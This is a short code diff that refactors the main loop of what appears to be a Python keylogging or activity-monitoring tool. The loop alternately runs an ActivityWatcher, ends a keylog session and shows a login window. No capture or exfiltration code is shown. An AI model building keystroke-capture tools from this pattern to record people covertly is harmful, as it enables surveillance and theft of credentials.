@@ -1,5 +1,13 @@
-from dependencies import *
+from logger.dependencies import *
 
-while True:
-    ActivityWatcher().watch()
-    LoginGui.show_login()
+
+def main():
+    while True:
+        aw = ActivityWatcher()
+        aw.watch()
+        aw.end_keylog()
+        LoginGui.show_login()
+
+
+if __name__ == "__main__":
+    main()
